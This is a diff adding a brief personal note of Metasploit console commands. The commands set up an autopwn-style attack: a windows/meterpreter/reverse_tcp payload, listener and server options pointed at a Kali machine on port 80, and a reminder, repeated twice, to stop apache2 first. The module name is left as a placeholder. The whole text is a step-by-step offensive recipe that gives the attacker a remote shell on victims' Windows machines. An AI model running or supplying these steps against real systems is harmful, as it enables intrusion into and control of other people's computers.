@@ -1,0 +1,18 @@
+msf> search autopwn
+msf> use "-------"
+msf> set payload windows/meterpreter/reverse_tcp
+
+*** If ur apache service is running plz take it down:
+service apache2 stop ***
+
+show options
+set lhost kali-ip
+set srvhost kali-ip
+set srvport 80
+set uripath /
+run
+
+
+*** If ur apache service is running plz take it down
+
+service apache2 stop ***
